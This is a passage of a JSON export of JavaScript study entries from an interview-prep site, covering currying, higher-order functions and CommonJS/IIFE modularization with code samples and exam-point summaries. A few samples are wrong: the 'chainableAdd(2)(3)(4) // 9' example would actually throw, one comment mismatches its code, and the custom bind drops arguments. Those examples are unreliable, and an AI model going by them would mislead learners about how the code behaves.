5]\n```\n\n\n\n在上面例子的注释中详细阐述了map方法的细节。现在要面临一个难题，就是如何封装map。\n\n\n\n可以先想想for循环。我们可以使用for循环来实现一个map，但是在封装的时候，我们会考虑一些问题。我们在使用for循环的时候，一个循环过程确实很好封装，但是我们在for循环里面要对每一项做的事情却很难用一个固定的东西去把它封装起来。因为每一个场景，for循环里对数据的处理肯定都是不一样的。\n\n\n\n于是大家就想了一个很好的办法，将这些不一样的操作单独用一个函数来处理，让这个函数成为map方法的第一个参数，具体这个回调函数中会是什么样的操作，则由我们自己在使用时决定。因此，根据这个思路的封装实现如下。\n\n\n\n```javascript\nArray.prototype._map = function(fn, context) {\n    var temp = [];\n    if(typeof fn == 'function') {\n        var k = 0;\n        var len = this.length;\n        // 封装for循环过程\n        for(; k < len; k++) {\n            // 将每一项的运算操作丢进fn里，利用call方法指定fn的this指向与具体参数\n            temp.push(fn.call(context, this[k], k, this))\n        }\n    } else {\n        console.error('TypeError: '+ fn +' is not a function.');\n    }\n\n    // 返回每一项运算结果组成的新数组\n    return temp;\n}\n\nvar newArr = [1, 2, 3, 4]._map(function(item) {\n    return item + 1;\n})\n// [2, 3, 4, 5]\n```\n\n\n\n在上面的封装中，我首先定义了一个空的temp数组，该数组用来存储最终的返回结果。在for循环中，每循环一次，就执行一次参数fn函数，fn的参数则使用call方法传入。\n\n\n\n> 在理解了map的封装过程之后，我们就能够明白为什么我们在使用map时，总是期望能够在第一个回调函数中有一个返回值了。在eslint的规则中，如果我们在使用map时没有设置一个返回值，就会被判定为错误。\n>\n\n\n\nok，明白了函数的隐式转换规则与call/apply在这种场景的使用方式，我们就可以尝试通过简单的例子来了解一下柯里化了。\n\n\n\n##### 三、由浅入深的柯里化\n\n\n在前端面试中有一个关于柯里化的面试题，流传甚广。\n\n\n\n> 实现一个add方法，使计算结果能够满足如下预期：  \n`add(1)(2)(3) = 6`  \n`add(1, 2, 3)(4) = 10`  \n`add(1)(2)(3)(4)(5) = 15`\n>\n\n\n\n很明显，计算结果正是所有参数的和，add方法每运行一次，肯定返回了一个同样的函数，继续计算剩下的参数。\n\n\n\n我们可以从最简单的例子一步一步寻找解决方案。\n\n\n\n当我们只调用两次时，可以这样封装。\n\n\n\n```plain\nfunction add(a) {\n    return function(b) {\n        return a + b;\n    }\n}\n\nconsole.log(add(1)(2));  // 3\n```\n\n\n\n如果只调用三次：\n\n\n\n```plain\nfunction add(a) {\n    return function(b) {\n        return function (c) {\n            return a + b + c;\n        }\n    }\n}\n\nconsole.log(add(1)(2)(3)); // 6\n```\n\n\n\n上面的封装看上去跟我们想要的结果有点类似，但是参数的使用被限制得很死，因此并不是我们想要的最终结果，我们需要通用的封装。应该怎么办？总结一下上面2个例子，其实我们是利用闭包的特性，将所有的参数，集中到最后返回的函数里进行计算并返回结果。因此我们在封装时，主要的目的，就是将参数集中起来计算。\n\n\n\n来看看具体实现。\n\n\n\n```plain\nfunction add() {\n    // 第一次执行时，定义一个数组专门用来存储所有的参数\n    var _args = [].slice.call(arguments);\n\n    // 在内部声明一个函数，利用闭包的特性保存_args并收集所有的参数值\n    var adder = function () {\n        var _adder = function() {\n            [].push.apply(_args, [].slice.call(arguments));\n            return _adder;\n        };\n\n        // 利用隐式转换的特性，当最后执行时隐式转换，并计算最终的值返回\n        _adder.toString = function () {\n            return _args.reduce(function (a, b) {\n                return a + b;\n            });\n        }\n\n        return _adder;\n    }\n    return adder.apply(null, [].slice.call(arguments));\n}\n\n// 输出结果，可自由组合的参数\nconsole.log(add(1, 2, 3, 4, 5));  // 15\nconsole.log(add(1, 2, 3, 4)(5));  // 15\nconsole.log(add(1)(2)(3)(4)(5));  // 15\n```\n\n\n\n上面的实现，利用闭包的特性，主要目的是想通过一些巧妙的方法将所有的参数收集在一个数组里，并在最终隐式转换时将数组里的所有项加起来。因此我们在调用add方法的时候，参数就显得非常灵活。当然，也就很轻松的满足了我们的需求。\n\n\n\n那么读懂了上面的demo，然后我们再来看看柯里化的定义，相信大家就会更加容易理解了。\n\n\n\n> 柯里化（英语：Currying），又称为部分求值，是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回一个新的函数的技术，新函数接受余下参数并返回运算结果。\n>\n\n\n\n+ 接收单一参数，因为要携带不少信息，因此常常以回调函数的理由来解决。\n+ 将部分参数通过回调函数等方式传入函数中\n+ 返回一个新函数，用于处理所有的想要传入的参数\n\n\n\n在上面的例子中，我们可以将`add(1, 2, 3, 4)`转换为`add(1)(2)(3)(4)`。这就是部分求值。每次传入的参数都只是我们想要传入的所有参数中的一部分。当然实际应用中，并不会常常这么复杂的去处理参数，很多时候也仅仅只是分成两部分而已。\n\n\n\n咱们再来一起思考一个与柯里化相关的问题。\n\n\n\n> 假如有一个计算要求，需要我们将数组里面的每一项用我们自己想要的字符给连起来。我们应该怎么做？想到使用join方法，就很简单。\n>\n\n\n\n```plain\nvar arr = [1, 2, 3, 4, 5];\n\n// 实际开发中并不建议直接给Array扩展新的方法\n// 只是用这种方式演示能够更加清晰一点\nArray.prototype.merge = function(chars) {\n    return this.join(chars);\n}\n\nvar string = arr.merge('-')\n\nconsole.log(string);  // 1-2-3-4-5\n```\n\n\n\n增加难度，将每一项加一个数后再连起来。那么这里就需要map来帮助我们对每一项进行特殊的运算处理，生成新的数组然后用字符连接起来了。实现如下：\n\n\n\n```typescript\nvar arr = [1, 2, 3, 4, 5];\n\nArray.prototype.merge = function(chars, number) {\n    return this.map(function(item) {\n        return item + number;\n    }).join(chars);\n}\n\nvar string = arr.merge('-', 1);\n\nconsole.log(string); // 2-3-4-5-6\n```\n\n\n\n但是如果我们又想要让数组每一项都减去一个数之后再连起来呢？当然和上面的加法操作一样的实现。\n\n\n\n```typescript\nvar arr = [1, 2, 3, 4, 5];\n\nArray.prototype.merge = function(chars, number) {\n    return this.map(function(item) {\n        return item - number;\n    }).join(chars);\n}\n\nvar string = arr.merge('~', 1);\n\nconsole.log(string); // 0~1~2~3~4\n```\n\n\n\n机智的小伙伴肯定发现困惑所在了。我们期望封装一个函数，能同时处理不同的运算过程，但是我们并不能使用一个固定的套路将对每一项的操作都封装起来。于是问题就变成了和封装map的时候所面临的问题一样了。我们可以借助柯里化来搞定。\n\n\n\n与map封装同样的道理，既然我们事先并不确定我们将要对每一项数据进行怎么样的处理，我只是知道我们需要将他们处理之后然后用字符连起来，所以不妨将处理内容保存在一个函数里。而仅仅固定封装连起来的这一部分需求。\n\n\n\n于是我们就有了以下的封装。\n\n\n\n```plain\n// 封装很简单，一句话搞定\nArray.prototype.merge = function(fn, chars) {\n    return this.map(fn).join(chars);\n}\n\nvar arr = [1, 2, 3, 4];\n\n// 难点在于，在实际使用的时候，操作怎么来定义，利用闭包保存于传递num参数\nvar add = function(num) {\n    return function(item) {\n        return item + num;\n    }\n}\n\nvar red = function(num) {\n    return function(item) {\n        return item - num;\n    }\n}\n\n// 每一项加2后合并\nvar res1 = arr.merge(add(2), '-');\n\n// 每一项减2后合并\nvar res2 = arr.merge(red(1), '-');\n\n// 也可以直接使用回调函数，每一项乘2后合并\nvar res3 = arr.merge((function(num) {\n    return function(item) {\n        return item * num\n    }\n})(2), '-')\n\nconsole.log(res1); // 3-4-5-6\nconsole.log(res2); // 0-1-2-3\nconsole.log(res3); // 2-4-6-8\n```\n\n\n\n大家能从上面的例子，发现柯里化的特征吗？\n\n\n\n##### 四、柯里化通用式\n\n\n通用的柯里化写法其实比我们上边封装的add方法要简单许多。\n\n\n\n```javascript\nvar currying = function(fn) {\n    var args = [].slice.call(arguments, 1);\n\n    return function() {\n        // 主要还是收集所有需要的参数到一个数组中，便于统一计算\n        var _args = args.concat([].slice.call(arguments));\n        return fn.apply(null, _args);\n    }\n}\n\nvar sum = currying(function() {\n    var args = [].slice.call(arguments);\n    return args.reduce(function(a, b) {\n        return a + b;\n    })\n}, 10)\n\nconsole.log(sum(20, 10));  // 40\nconsole.log(sum(10, 5));   // 25\n```\n\n\n\n##### 五、柯里化与bind\n\n\n```javascript\nObject.prototype.bind = function(context) {\n    var _this = this;\n    var args = [].slice.call(arguments, 1);\n\n    return function() {\n        return _this.apply(context, args)\n    }\n}\n```\n\n\n\n这个例子利用call与apply的灵活运用，实现了bind的功能。\n\n\n\n在前面的几个例子中，我们可以总结一下柯里化的特点：\n\n\n\n+ 接收单一参数，将更多的参数通过回调函数来搞定？\n+ 返回一个新函数，用于处理所有的想要传入的参数；\n+ 需要利用call/apply与arguments对象收集参数；\n+ 返回的这个函数正是用来处理收集起来的参数。\n\n",
    "testPoint": "### 1. **柯里化的定义**\n   - **基本概念**：柯里化是将一个多参数函数转换为多个单参数函数的过程。每个函数返回一个新的函数，直到所有参数都被提供。\n   - **示例**：\n     ```javascript\n     function add(a) {\n         return function(b) {\n             return a + b;\n         };\n     }\n     const add5 = add(5);\n     console.log(add5(3)); // 8\n     ```\n\n### 2. **柯里化的实现**\n   - **基本实现**：可以通过闭包实现柯里化。\n   - **示例**：\n     ```javascript\n     function curry(func) {\n         return function curried(...args) {\n             if (args.length >= func.length) {\n                 return func(...args);\n             } else {\n                 return function(...args2) {\n                     return curried(...args.concat(args2));\n                 };\n             }\n         };\n     }\n\n     function multiply(a, b) {\n         return a * b;\n     }\n\n     const curriedMultiply = curry(multiply);\n     console.log(curriedMultiply(2)(3)); // 6\n     ```\n\n### 3. **柯里化的应用**\n   - **部分应用**：柯里化允许你创建部分应用的函数，即只传递部分参数，返回一个新的函数。\n   - **示例**：\n     ```javascript\n     function multiply(a, b, c) {\n         return a * b * c;\n     }\n\n     const multiplyBy2 = curry(multiply)(2);\n     console.log(multiplyBy2(3, 4)); // 24\n     ```\n\n### 4. **柯里化的优点**\n   - **提高可读性**：柯里化可以使代码更简洁，提升可读性。\n   - **更好的复用性**：通过柯里化，生成的部分应用函数可以在不同的上下文中复用。\n   - **延迟执行**：柯里化允许你延迟某些操作的执行，直到所有参数都准备好。\n\n### 5. **柯里化的缺点**\n   - **性能开销**：过度使用柯里化可能导致性能下降，尤其是在需要频繁调用函数的场景中。\n   - **复杂性**：对于简单函数，柯里化可能增加不必要的复杂性。\n\n### 6. **与函数式编程的关系**\n   - **函数式编程**：柯里化是函数式编程的重要特性，支持高阶函数和组合。\n   - **函数组合**：柯里化与函数组合（function composition）一起使用，能够创建更复杂的功能。\n\n### 7. **ES6 中的柯里化**\n   - **使用箭头函数**：在 ES6 中，可以使用箭头函数简化柯里化的实现。\n   - **示例**：\n     ```javascript\n     const curry = (func) => (...args) =>\n         args.length >= func.length\n             ? func(...args)\n             : (...args2) => curry(func)(...args, ...args2);\n\n     const add = (a, b) => a + b;\n     const curriedAdd = curry(add);\n     console.log(curriedAdd(2)(3)); // 5\n     ```\n\n### 8. **实用的柯里化库**\n   - **lodash**：`_.curry` 方法可以用来轻松创建柯里化函数。\n   - **ramda**：提供了多种函数式编程工具，包括柯里化。\n\n### 9. **使用场景**\n   - **函数组合**：在处理组合函数时，柯里化能够帮助构建更灵活的函数。\n   - **配置函数**：在需要配置某些参数的场景中，柯里化可以让配置过程更清晰。\n\n### 10. **柯里化与链式调用**\n   - **链式调用的支持**：通过柯里化，可以方便地实现链式调用。\n   - **示例**：\n     ```javascript\n     const chainableAdd = curry((a, b) => {\n         return a + b;\n     });\n\n     console.log(chainableAdd(2)(3)(4)); // 9\n     ```\n",
    "exerciseKeyList": "[\"dc0b6bc1-71a9-4dec-a1df-a63d08f1c888\"]",
    "vipLimit": 0,
    "level": 3,
    "pointOrder": 9,
    "createAt": "2024-10-01T12:44:42.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "dc0b6bc1-71a9-4dec-a1df-a63d08f1c888",
        "title": "实现柯里化",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T08:05:50.000Z",
        "updateAt": "2021-07-11T16:10:48.000Z"
      }
    ]
  },
  "20": {
    "id": 20,
    "tagId": 10,
    "title": "高阶函数",
    "explanation": "高阶函数是指那些可以接受函数作为参数或者返回函数作为结果的函数。这种特性使得JavaScript的函数变得异常灵活和强大，为开发者提供了丰富的工具和手段来编写更加简洁、可重用和模块化的代码。\n\n本文将详细介绍JavaScript高阶函数的概念、特性、常见用法以及在实际开发中的应用。\n\n#### 一、高阶函数的概念\n\n高阶函数是函数式编程中的一个核心概念。在JavaScript中，函数是一等公民，这意味着函数可以像其他数据类型（如数字、字符串、对象等）一样被传递和操作。高阶函数正是利用了这一特性，使得函数可以作为参数传递给其他函数，或者作为其他函数的返回值。\n\n#### 二、高阶函数的特性\n\n1. **函数作为参数**：高阶函数可以接受一个或多个函数作为参数。这使得我们可以将特定的行为（即函数）作为参数传递给高阶函数，从而实现更加灵活和可重用的代码。\n\n2. **函数作为返回值**：高阶函数可以返回一个函数作为结果。这种特性允许我们创建可以动态生成新函数的函数，这些新函数可以根据需要执行不同的行为。\n\n3. **闭包**：闭包是高阶函数的一个重要特性。闭包允许函数访问其外部作用域中的变量，即使该函数在其外部作用域之外执行。这使得高阶函数可以捕获和存储状态，从而创建更加复杂和强大的函数行为。\n\n#### 三、高阶函数的常见用法\n\n1. **数组方法**：JavaScript中的数组方法（如`map`、`filter`、`reduce`等）都是高阶函数的典型例子。这些方法接受一个函数作为参数，并对数组中的每个元素执行该函数，从而返回一个新的数组或单一结果。\n\n   - `map`方法：用于创建一个新数组，其结果是该数组中的每个元素调用一个提供的函数后返回的结果。\n   - `filter`方法：创建一个新数组，其包含通过所提供函数实现的测试的所有元素。\n   - `reduce`方法：对数组中的每个元素执行一个由您提供的reducer函数(升序执行)，将其结果汇总为单个返回值。\n\n2. **函数组合**：函数组合是指将多个函数组合在一起形成一个新的函数。通过高阶函数，我们可以轻松地将多个函数组合在一起，从而创建一个更加复杂和强大的函数。这种技术在实际开发中非常有用，特别是当我们需要处理一系列转换或操作时。\n\n3. **柯里化**：柯里化是一种将接收多个参数的函数转换为一系列接收单一参数的函数的技术。虽然柯里化本身不是高阶函数，但高阶函数在实现柯里化时扮演着重要角色。通过高阶函数，我们可以创建一个接受原始函数作为参数的柯里化函数，并返回一个新的函数来处理单一参数。\n\n4. **创建高阶函数**：我们可以编写自己的高阶函数来实现特定的行为。例如，我们可以编写一个高阶函数来接受一个函数和一个数组作为参数，并返回该数组中应用该函数后的结果。\n\n#### 四、高阶函数在实际开发中的应用\n\n\n#### 1. 数据转换\n\n高阶函数非常适合用于数据的转换和映射。例如，我们可以使用`Array.prototype.map`方法将一个数组中的每个元素转换为另一种形式。\n\n```javascript\n// 定义一个高阶函数，它接受一个转换函数和一个数组作为参数\nconst transformArray = (transformFn, array) => array.map(transformFn);\n\n// 定义一个简单的转换函数，将数字转换为它的平方\nconst square = x => x * x;\n\n// 使用高阶函数和转换函数来处理数组\nconst numbers = [1, 2, 3, 4, 5];\nconst squaredNumbers = transformArray(square, numbers);\n\nconsole.log(squaredNumbers); // 输出: [1, 4, 9, 16, 25]\n```\n\n在这个例子中，`transformArray`是一个高阶函数，它接受一个转换函数`transformFn`和一个数组`array`作为参数。然后，它使用`Array.prototype.map`方法来遍历数组，并对每个元素应用转换函数。\n\n#### 2. 事件处理\n\n在Web开发中，事件处理是一个常见的任务。通过高阶函数，我们可以创建更加灵活和可重用的事件处理器。\n\n```javascript\n// 定义一个高阶函数，它接受一个事件处理函数和一个事件类型作为参数\nconst createEventHandler = (handlerFn, eventType) => event => {\n  if (event.type === eventType) {\n    handlerFn(event);\n  }\n};\n\n// 定义一个简单的事件处理函数，用于打印事件信息\nconst logEvent = event => console.log(`Event type: ${event.type}, Target: ${event.target}`);\n\n// 创建一个点击事件处理器\nconst handleClick = createEventHandler(logEvent, 'click');\n\n// 假设我们有一个DOM元素，我们可以为它添加事件监听器\n// const button = document.querySelector('button');\n// button.addEventListener('click', handleClick);\n\n// 为了演示，我们直接调用处理器并传递一个模拟的事件对象\nconst mockEvent = { type: 'click', target: document.body };\nhandleClick(mockEvent); // 输出: Event type: click, Target: [object HTMLBodyElement]\n```\n\n在这个例子中，`createEventHandler`是一个高阶函数，它接受一个事件处理函数`handlerFn`和一个事件类型`eventType`作为参数，并返回一个新的函数。这个新的函数会检查传入的事件对象的类型是否与指定的事件类型匹配，如果匹配，则调用事件处理函数。\n\n#### 3. 异步编程\n\n在JavaScript中，异步编程是一个重要的概念。通过高阶函数，我们可以创建更加简洁和可读的异步代码。例如，我们可以使用`Promise`对象来处理异步操作，并使用高阶函数（如`then`和`catch`）来处理成功和失败的情况。虽然`then`和`catch`不是传统意义上的高阶函数（它们不是返回函数的函数），但它们确实接受函数作为参数，并表现出高阶函数的特性。\n\n```javascript\n// 定义一个返回Promise的高阶函数，它接受一个异步操作函数作为参数\nconst asyncOperation = asyncFn => new Promise((resolve, reject) => {\n  try {\n    const result = asyncFn();\n    resolve(result);\n  } catch (error) {\n    reject(error);\n  }\n});\n\n// 定义一个模拟的异步操作函数，它返回一个Promise\nconst fetchData = () => new Promise((resolve) => {\n  setTimeout(() => {\n    resolve('Data fetched successfully!');\n  }, 1000);\n});\n\n// 使用高阶函数来处理异步操作\nasyncOperation(fetchData)\n  .then(data => console.log(data)) // 输出: Data fetched successfully!\n  .catch(error => console.error(error));\n```\n\n在这个例子中，`asyncOperation`是一个高阶函数，它接受一个异步操作函数`asyncFn`作为参数，并返回一个新的`Promise`对象。这个`Promise`对象会调用异步操作函数，并在操作成功时解析（resolve）结果，或在操作失败时拒绝（reject）错误。\n\n#### 4. 函数组合\n\n函数组合是指将多个函数组合在一起形成一个新的函数。通过高阶函数，我们可以轻松地将多个函数组合在一起，从而创建一个更加复杂和强大的函数。\n\n```javascript\n// 定义一个高阶函数，用于组合两个函数\nconst compose = (f, g) => x => f(g(x));\n\n// 定义两个简单的函数\nconst add = x => x + 1;\nconst multiply = x => x * 2;\n\n// 使用高阶函数来组合这两个函数\nconst addThenMultiply = compose(multiply, add);\n\n// 调用组合后的函数\nconsole.log(addThenMultiply(5)); // 输出: 12 (相当于 (5+1) * 2)\n```\n\n在这个例子中，`compose`是一个高阶函数，它接受两个函数`f`和`g`作为参数，并返回一个新的函数。这个新的函数会先调用`g`函数，然后将`g`函数的结果作为参数传递给`f`函数。通过这种方式，我们可以将多个函数组合在一起，形成一个新的函数来处理更复杂的行为。\n",
    "testPoint": "### 一、高阶函数的基本概念\n\n1. **定义**：能够接收另一个函数作为参数或者返回值为一个函数的函数，被称为高阶函数。\n2. **常见高阶函数**：在JavaScript中，常见的数组高阶函数有`map`、`filter`、`reduce`、`sort`（虽然`sort`通常不直接视为高阶函数，但其可以接收一个比较函数作为参数，因此也具有一定的高阶特性）。\n\n### 二、高阶函数的具体应用\n\n1. **map函数**：\n\n   * **作用**：创建一个新数组，其结果是该数组中的每个元素都调用提供的函数后返回的结果。\n   * **考点**：如何正确使用`map`函数对数组进行转换，以及理解`map`函数不会改变原数组的特性。\n\n2. **filter函数**：\n\n   * **作用**：创建一个新数组，其包含通过所提供函数实现的测试的所有元素。\n   * **考点**：如何正确使用`filter`函数筛选数组中的元素，以及理解`filter`函数的返回值是一个新数组。\n\n3. **reduce函数**：\n\n   * **作用**：对数组中的每个元素执行一个由您提供的reducer函数（升序执行），将其结果汇总为单个返回值。\n   * **考点**：如何正确使用`reduce`函数对数组进行汇总操作，如求和、计算平均值等，以及理解`reduce`函数的初始值（如果有）和累加器的概念。\n\n4. **sort函数**（高阶特性）：\n\n   * **作用**：对数组的元素进行排序并返回数组。\n   * **高阶特性**：可以接收一个比较函数作为参数，用于定义排序的顺序。\n   * **考点**：如何正确使用比较函数来定义排序顺序，以及理解`sort`函数会直接修改原数组的特性。\n\n### 三、高阶函数的组合与链式调用\n\n1. **函数组合**：\n\n   * **考点**：如何理解并应用函数组合的概念，将多个高阶函数组合在一起以形成更复杂的逻辑。\n\n2. **链式调用**：\n\n   * **考点**：如何理解并应用链式调用的概念，通过多个高阶函数的连续调用来处理数据。\n\n### 四、高阶函数与闭包的关系\n\n1. **闭包**：\n\n   * **定义**：是指一个函数能够记住并访问它的词法作用域，即使这个函数在词法作用域之外执行。\n   * **考点**：如何理解闭包的概念，以及闭包在高阶函数中的应用（如创建私有变量、模拟块级作用域等）。\n\n2. **高阶函数与闭包的结合**：\n\n   * **考点**：如何理解并应用高阶函数与闭包的结合，以创建更加灵活和可重用的代码。\n\n",
    "exerciseKeyList": "[\"c5e64dfd-ab08-4fbc-9970-31772fe1d8ee\"]",
    "vipLimit": 0,
    "level": 3.5,
    "pointOrder": 11,
    "createAt": "2024-10-01T12:58:02.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "c5e64dfd-ab08-4fbc-9970-31772fe1d8ee",
        "title": "说说你对高阶函数的理解",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-11-06T15:06:19.000Z",
        "updateAt": "2024-11-06T15:06:23.000Z"
      }
    ]
  },
  "21": {
    "id": 21,
    "tagId": 10,
    "title": "模块化",
    "explanation": "## 前言\n\n在JavaScript发展初期就是为了实现简单的页面交互逻辑，寥寥数语即可；如今CPU、浏览器性能得到了极大的提升，很多页面逻辑迁移到了客户端（表单验证等），随着web2.0时代的到来，Ajax技术得到广泛应用，jQuery等前端库层出不穷，前端代码日益膨胀，此时在JS方面就会考虑使用模块化规范去管理。 本文内容主要有理解模块化，为什么要模块化，模块化的优缺点以及模块化规范,并且介绍下开发中最流行的CommonJS, AMD, ES6、CMD规范。\n\n本文试图站在小白的角度，用通俗易懂的笔调介绍这些枯燥无味的概念，希望诸君阅读后，对模块化编程有个全新的认识和理解！\n\n![模块化规范](https://static.ecool.fun//article/1c81d581-75ac-4944-ac37-b1b7b64cbdc9.png)\n\n## 一、模块化的理解\n\n### 1.什么是模块?\n\n-   将一个复杂的程序依据一定的规则(规范)封装成几个块(文件), 并进行组合在一起\n-   块的内部数据与实现是私有的, 只是向外部暴露一些接口(方法)与外部其它模块通信\n\n### 2.模块化的进化过程\n\n-   **全局function模式 : 将不同的功能封装成不同的全局函数**\n    -   编码: 将不同的功能封装成不同的全局函数\n    -   问题: 污染全局命名空间, 容易引起命名冲突或数据不安全，而且模块成员之间看不出直接关系\n\n```bash\nfunction m1(){\n  //...\n}\nfunction m2(){\n  //...\n}\n```\n\n-   **namespace模式 : 简单对象封装**\n    -   作用: 减少了全局变量，解决命名冲突\n    -   问题: 数据不安全(外部可以直接修改模块内部的数据)\n\n```bash\nlet myModule = {\n  data: 'www.baidu.com',\n  foo() {\n    console.log(`foo() ${this.data}`)\n  },\n  bar() {\n    console.log(`bar() ${this.data}`)\n  }\n}\nmyModule.data = 'other data' //能直接修改模块内部的数据\nmyModule.foo() // foo() other data\n```\n\n这样的写法会暴露所有模块成员，内部状态可以被外部改写。\n\n-   **IIFE模式：匿名函数自调用(闭包)**\n    -   作用: 数据是私有的, 外部只能通过暴露的方法操作\n    -   编码: 将数据和行为封装到一个函数内部, 通过给window添加属性来向外暴露接口\n    -   问题: 如果当前这个模块依赖另一个模块怎么办?\n\n```bash\n// index.html文件\n<script type=\"text/javascript\" src=\"module.js\"></script>\n<script type=\"text/javascript\">\n    myModule.foo()\n    myModule.bar()\n    console.log(myModule.data) //undefined 不能访问模块内部数据\n    myModule.data = 'xxxx' //不是修改的模块内部的data\n    myModule.foo() //没有改变\n</script>\n```\n\n```bash\n// module.js文件\n(function(window) {\n  let data = 'www.baidu.com'\n  //操作数据的函数\n  function foo() {\n    //用于暴露有函数\n    console.log(`foo() ${data}`)\n  }\n  function bar() {\n    //用于暴露有函数\n    console.log(`bar() ${data}`)\n    otherFun() //内部调用\n  }\n  function otherFun() {\n    //内部私有的函数\n    console.log('otherFun()')\n  }\n  //暴露行为\n  window.myModule = { foo, bar } //ES6写法\n})(window)\n```\n\n最后得到的结果：\n\n![](https://static.ecool.fun//article/cbe3580e-cf2e-4689-a335-ccd124865b06.png)\n\n-   **IIFE模式增强 : 引入依赖**\n\n这就是现代模块实现的基石\n\n```bash\n// module.js文件\n(function(window, $) {\n  let data = 'www.baidu.com'\n  //操作数据的函数\n  function foo() {\n    //用于暴露有函数\n    console.log(`foo() ${data}`)\n    $('body').css('background', 'red')\n  }\n  function bar() {\n    //用于暴露有函数\n    console.log(`bar() ${data}`)\n    otherFun() //内部调用\n  }\n  function otherFun() {\n    //内部私有的函数\n    console.log('otherFun()')\n  }\n  //暴露行为\n  window.myModule = { foo, bar }\n})(window, jQuery)\n```\n\n```bash\n // index.html文件\n  <!-- 引入的js必须有一定顺序 -->\n  <script type=\"text/javascript\" src=\"jquery-1.10.1.js\"></script>\n  <script type=\"text/javascript\" src=\"module.js\"></script>\n  <script type=\"text/javascript\">\n    myModule.foo()\n  </script>\n```\n\n上例子通过jquery方法将页面的背景颜色改成红色，所以必须先引入jQuery库，就把这个库当作参数传入。**这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显**。\n\n### 3\\. 模块化的好处\n\n-   避免命名冲突(减少命名空间污染)\n-   更好的分离, 按需加载\n-   更高复用性\n-   高可维护性\n\n### 4\\. 引入多个`<script>`后出现出现问题\n\n-   请求过多\n\n首先我们要依赖多个模块，那样就会发送多个请求，导致请求过多\n\n-   依赖模糊\n\n我们不知道他们的具体依赖关系是什么，也就是说很容易因为不了解他们之间的依赖关系导致加载先后顺序出错。\n\n-   难以维护\n\n以上两种原因就导致了很难维护，很可能出现牵一发而动全身的情况导致项目出现严重的问题。 模块化固然有多个好处，然而一个页面需要引入多个js文件，就会出现以上这些问题。而这些问题可以通过模块化规范来解决，下面介绍开发中最流行的commonjs, AMD, ES6, CMD规范。\n\n## 二、模块化规范\n\n### 1.CommonJS\n\n#### (1)概述\n\nNode 应用由模块组成，采用 CommonJS 模块规范。每个文件就是一个模块，有自己的作用域。在一个文件里面定义的变量、函数、类，都是私有的，对其他文件不可见。**在服务器端，模块的加载是运行时同步加载的；在浏览器端，模块需要提前编译打包处理。**\n\n#### (2)特点\n\n-   所有代码都运行在模块作用域，不会污染全局作用域。\n-   模块可以多次加载，但是只会在第一次加载时运行一次，然后运行结果就被缓存了，以后再加载，就直接读取缓存结果。要想让模块再次运行，必须清除缓存。\n-   模块加载的顺序，按照其在代码中出现的顺序。\n\n#### (3)基本语法\n\n-   暴露模块：`module.exports = value`或`exports.xxx = value`\n-   引入模块：`require(xxx)`,如果是第三方模块，xxx为模块名；如果是自定义模块，xxx为模块文件路径\n\n此处我们有个疑问：**CommonJS暴露的模块到底是什么?** CommonJS规范规定，每个模块内部，module变量代表当前模块。这个变量是一个对象，它的exports属性（即module.exports）是对外的接口。**加载某个模块，其实是加载该模块的module.exports属性**。\n\n```bash\n// example.js\nvar x = 5;\nvar addX = function (value) {\n  return value + x;\n};\nmodule.exports.x = x;\nmodule.exports.addX = addX;\n```\n\n上面代码通过module.exports输出变量x和函数addX。\n\n```bash\nvar example = require('./example.js');//如果参数字符串以“./”开头，则表示加载的是一个位于相对路径\nconsole.log(example.x); // 5\nconsole.log(example.addX(1)); // 6\n```\n\nrequire命令用于加载模块文件。**require命令的基本功能是，读入并执行一个JavaScript文件，然后返回该模块的exports对象。如果没有发现指定模块，会报错**。\n\n#### (4)模块的加载机制\n\n**CommonJS模块的加载机制是，输入的是被输出的值的拷贝。也就是说，一旦输出一个值，模块内部的变化就影响不到这个值**。这点与ES6模块化有重大差异（下文会介绍），请看下面这个例子：\n\n```bash\n// lib.js\nvar counter = 3;\nfunction incCounter() {\n  counter++;\n}\nmodule.exports = {\n  counter: counter,\n  incCounter: incCounter,\n};\n\n```\n\n上面代码输出内部变量counter和改写这个变量的内部方法incCounter。\n\n```bash\n// main.js\nvar counter = require('./lib').counter;\nvar incCounter = require('./lib').incCounter;\n\nconsole.log(counter);  // 3\nincCounter();\nconsole.log(counter); // 3\n```\n\n上面代码说明，counter输出以后，lib.js模块内部的变化就影响不到counter了。**这是因为counter是一个原始类型的值，会被缓存。除非写成一个函数，才能得到内部变动后的值**。\n\n#### (5)服务器端实现\n\n#### ①下载安装node.js\n\n#### ②创建项目结构\n\n**注意：用npm init 自动生成package.json时，package name(包名)不能有中文和大写**\n\n```bash\n|-modules\n  |-module1.js\n  |-module2.js\n  |-module3.js\n|-app.js\n|-package.json\n  {\n    \"name\": \"commonJS-node\",\n    \"version\": \"1.0.0\"\n  }\n```\n\n#### ③下载第三方模块\n\n`npm install uniq --save // 用于数组去重`\n\n#### ④定义模块代码\n\n```bash\n//module1.js\nmodule.exports = {\n  msg: 'module1',\n  foo() {\n    console.log(this.msg)\n  }\n}\n```\n\n```bash\n//module2.js\nmodule.exports = function() {\n  console.log('module2')\n}\n```\n\n```bash\n//module3.js\nexports.foo = function() {\n  console.log('foo() module3')\n}\nexports.arr = [1, 2, 3, 3, 2]\n```\n\n```bash\n// app.js文件\n// 引入第三方库，应该放置在最前面\nlet uniq = require('uniq')\nlet module1 = require('./modules/module1')\nlet module2 = require('./modules/module2')\nlet module3 = require('./modules/module3')\n\nmodule1.foo() //module1\nmodule2() //module2\nmodule3.foo() //foo() module3\nconsole.log(uniq(module3.arr)) //[ 1, 2, 3 ]\n```\n\n#### ⑤通过node运行app.js\n\n命令行输入`node app.js`，运行JS文件\n\n#### (6)浏览器端实现(借助Browserify)\n\n#### ①创建项目结构\n\n```bash\n|-js\n  |-dist //打包生成文件的目录\n  |-src //源码所在的目录\n    |-module1.js\n    |-module2.js\n    |-module3.js\n    |-app.js //应用主源文件\n|-index.html //运行于浏览器上\n|-package.json\n  {\n    \"name\": \"browserify-test\",\n    \"version\": \"1.0.0\"\n  }\n```\n\n#### ②下载browserify\n\n-   全局: npm install browserify -g\n-   局部: npm install browserify --save-dev\n\n#### 